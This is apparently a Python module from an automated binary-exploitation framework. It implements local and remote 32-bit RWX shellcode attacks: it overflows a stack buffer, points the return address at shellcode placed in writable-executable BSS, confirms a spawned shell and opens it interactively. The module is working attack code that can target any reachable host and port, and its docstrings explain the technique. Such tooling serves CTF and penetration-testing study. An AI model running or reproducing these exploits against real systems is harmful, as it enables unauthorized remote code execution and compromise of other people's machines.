"""P7.6: x32 rwx shellcode strategies (local + remote).

Replaces the v3.1 monolith's ``rwx_shellcode_x32`` (L1933-1952, local)
+ ``rwx_shellcode_x32_remote`` (L2187-2206, remote) ad-hoc
functions with two :class:`ExploitStrategy` subclasses.

The RWX shellcode pattern
-------------------------
Unlike P7.3-P7.5 (which all chain ``system("/bin/sh")`` via
``ret2system``/``ret2libc``), RWX shellcode places actual
executable bytes at the **front** of the payload.  This works
when the target binary's BSS region is **writable AND
executable** (a misconfiguration that ``checksec`` flags as
``RWX segments: Has RWX segments``).  The strategy:

  1. Ask the P6.6 primitive to find a BSS symbol (size > 30)
     via :func:`autopwn.recon.bss.find_bss`.
  2. Build the shellcode payload:
     ``[shellcraft.sh() padded with NOPs to padding length] + p32(bss_addr)``
     The shellcode lives at the **front** of the buffer; the
     NOP sled bridges the offset; the saved return address
     is overwritten with the BSS address (where the shellcode
     now lives, ready to execute when the function returns).
  3. Send payload, drop to interactive shell.

Per ``rebuild.md`` §6.8 P7.6 + ``refactor.md`` §3.2.2 + P6.6
primitive contract.

Filter semantics: ``rwx_segments`` is a binary-level flag
-------------------------------------------------------
P7.6 is the **first** strategy to gate on a field that lives
on ``ctx.binary.*`` rather than ``ctx.*`` directly.  All
previous strategies (P7.3-P7.5) gate on the ``has_*`` PLT
flags which were promoted to the top-level ``ExploitContext``
by P4.7/P4.8 specifically so the default :meth:`ExploitStrategy.matches`
implementation (which does ``getattr(ctx, key)``) can read
them without descending into ``ctx.binary``.

``rwx_segments`` is a property of the binary itself
(``BinaryInfo.rwx_segments`` per ``context.py`` P2.1 design),
not a PLT presence flag, so it stays on ``ctx.binary``.  We
override :meth:`matches` here to read it from the right
namespace; this keeps the convention (other strategies
use top-level ctx fields) and localizes the special case
to just the rwx strategies.  Future strategies that need
other ``ctx.binary.*`` fields (e.g. ``stripped``, ``pie``)
can follow the same pattern.

P7.6 vs the other non-canary strategies
---------------------------------------
* **ret2system (P7.3, 150)**: needs ``system`` + ``/bin/sh`` in PLT
  / binary.  Fastest when both are present.
* **ret2libc_put (P7.4, 120)**: needs ``puts`` in PLT.  Leaks
  libc via ``puts(puts@GOT)``.
* **ret2libc_write (P7.5, 110)**: needs ``write`` in PLT.
* **rwx_shellcode (P7.6, 90)**: needs BSS RWX + large BSS
  symbol.  No libc dependency — shellcode is self-contained
  (pwntools ``shellcraft.sh()``).
* **execve_syscall (P7.7, 80)**: x32-only, no libc dep.
* **fmtstr (P7.8, 50)**: no-stack-overflow fallback.

P7.6 sits below ret2libc in priority because RWX is rarer
than libc leak capabilities in modern binaries (NX is the
default since ~2005).  But when RWX is present, this is
the cleanest path — no leak, no libc.
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RWX_SHELLCODE
from autopwn.exp.registry import register
from autopwn.primitives.shellcode import RwxShellcodeX32
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Local x32 strategy
# ---------------------------------------------------------------------------


@register
class RwxShellcodeX32LocalStrategy(ExploitStrategy):
    """Local 32-bit RWX shellcode injection.

    Metadata (``requires_*``):
      * ``arch = 32``
      * ``remote = False``
      * ``requires = ("rwx_segments",)`` — read from
        ``ctx.binary.rwx_segments`` (BinaryInfo field, populated
        by P4.1 ``recon.checksec.collect`` from the
        ``"Has RWX segments"`` checksec output).  See module
        docstring for why we override ``matches()`` to read
        from ``ctx.binary.*`` rather than the default
        ``ctx.*`` lookup.

    Priority ``RWX_SHELLCODE = 90`` per 附录 A.  Below
    ret2libc (110/120) but above execve (80) and fmtstr (50).
    """
    name = "rwx-shellcode-x32"
    priority = RWX_SHELLCODE
    requires_arch = 32
    requires_remote = False
    requires = ("rwx_segments",)

    def matches(self, ctx: ExploitContext) -> bool:
        """Override to read ``rwx_segments`` from ``ctx.binary.*``.

        See module docstring for the rationale.
        """
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        # custom: read rwx_segments from ctx.binary (BinaryInfo field)
        # rather than the default ``getattr(ctx, "rwx_segments")``
        return bool(ctx.binary.rwx_segments)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit RWX shellcode locally."""
        from pwn import process

        print_section_header("EXPLOITATION: RWX Shellcode - x32")
        print_payload("preparing RWX shellcode exploit")

        primitive = RwxShellcodeX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("rwx-shellcode-x32 primitive returned empty; skipping")
            return False

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="RWX Shellcode - x32",
            payload=payload,
            padding=ctx.padding,
            addresses={},
            vulnerability_type="Stack Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"RwxShellcodeX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Remote x32 strategy
# ---------------------------------------------------------------------------


@register
class RwxShellcodeX32RemoteStrategy(ExploitStrategy):
    """Remote 32-bit RWX shellcode injection.

    Same payload as :class:`RwxShellcodeX32LocalStrategy`;
    ``pwn.remote(host, port)`` instead of ``pwn.process(path)``.
    """
    name = "rwx-shellcode-x32-remote"
    priority = RWX_SHELLCODE
    requires_arch = 32
    requires_remote = True
    requires = ("rwx_segments",)

    def matches(self, ctx: ExploitContext) -> bool:
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        return bool(ctx.binary.rwx_segments)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit RWX shellcode against a remote service."""
        from pwn import remote

        if ctx.remote is None:
            print_info("rwx-shellcode-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: RWX Shellcode - x32 Remote")
        print_payload("preparing remote RWX shellcode exploit")

        primitive = RwxShellcodeX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("rwx-shellcode-x32-remote primitive returned empty; skipping")
            return False

        io = remote(host, port)
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="RWX Shellcode - x32 Remote",
            payload=payload,
            padding=ctx.padding,
            addresses={},
            vulnerability_type="Stack Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"RwxShellcodeX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


__all__ = [
    "RwxShellcodeX32LocalStrategy",
    "RwxShellcodeX32RemoteStrategy",
]
